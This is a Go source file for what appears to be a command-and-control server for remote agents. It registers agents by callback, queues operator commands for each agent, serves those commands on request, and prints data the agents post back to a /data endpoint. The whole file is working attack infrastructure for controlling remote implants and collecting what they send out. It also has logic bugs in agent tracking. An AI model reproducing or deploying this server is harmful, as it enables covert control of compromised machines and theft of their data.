package main
import (
	"github.com/gorilla/mux"
	"net/http"
	"fmt"
	"io/ioutil"
	"log"
	"time"
	"encoding/json"
)

type Agent struct{
	Name string
	LastCallBack int64
	FirstCallBack int64
}

var Agents []Agent
var Commands = make(map[string][]string)


func AddAgent(w http.ResponseWriter, r *http.Request){
	vars := mux.Vars(r)
	name := vars["agent"]
	currentTime := time.Now().Unix()
	newAgent := true
	for _,agent := range Agents{
		if agent.Name == name {
			agent.LastCallBack = currentTime
			newAgent = false
		}
	}
	if newAgent{
		Agents = append(Agents,Agent{Name:name,FirstCallBack:currentTime,LastCallBack:currentTime})
		fmt.Println(fmt.Sprintf("\n[+] Agent %s is Active [+]",name))
	}

}



func GetCommands(w http.ResponseWriter, r *http.Request){
	vars := mux.Vars(r)
	name := vars["agent"]
	AgentCommands := Commands[name]
	json_data, _ := json.Marshal(AgentCommands)
	// Clears the commands
	Commands[name] = nil
	w.Write(json_data)

}
// To be called internally not from web
func AddCommand(agentName string, command string)  {
	Commands[agentName] = append(Commands[agentName],command)
}


func PrintAgents(){
	if len(Agents) < 1{
		fmt.Println("[-] No Agents are active [-]")
	}
	for _,agent := range Agents{
		fmt.Println(agent.Name)
	}
}

func RemoveInactiveAgents(){

	for {
		time.Sleep(5 * time.Second)
		for i, agent := range Agents {
			// Removes the Agent from array if no callback was received last 30 seconds.
			if agent.LastCallBack < (time.Now().Unix() - 30) {
				Agents = append(Agents[:i], Agents[i+1:]...)
				fmt.Println(fmt.Sprintf("[-] Agent %s is inactive",agent.Name))
			}
		}
	}
}

func GetIndex(w http.ResponseWriter, r *http.Request){

	b, err := ioutil.ReadFile("static/index.html")
	if err != nil {
		log.Fatal(err)
	}
	w.Write(b)
}
func GetJS(w http.ResponseWriter, r *http.Request){

	b, err := ioutil.ReadFile("static/jquery.js")
	if err != nil {
		log.Fatal(err)
	}
	w.Write(b)
}

func PrintData(w http.ResponseWriter, r *http.Request){
	vars := mux.Vars(r)
	name := vars["agent"]
	data := r.FormValue("data")
	fmt.Println(fmt.Sprintf("[+] Incoming Data from : %s [+]",name))
	fmt.Println(data)
	w.Write([]byte("OK"))
}

func StartHTTPListener(port int)  {

	listener := mux.NewRouter()
	listener.HandleFunc("/",GetIndex).Methods("GET")
	listener.HandleFunc("/jquery.js",GetJS).Methods("GET")
	listener.HandleFunc("/callback/{agent}",AddAgent).Methods("GET")
	listener.HandleFunc("/commands/{agent}",GetCommands).Methods("GET")
	listener.HandleFunc("/data/{agent}",PrintData).Methods("POST")
	server := &http.Server{
		Addr:fmt.Sprintf("127.0.0.1:%d",port),
		Handler:listener,
	}
	server.ListenAndServe()
}
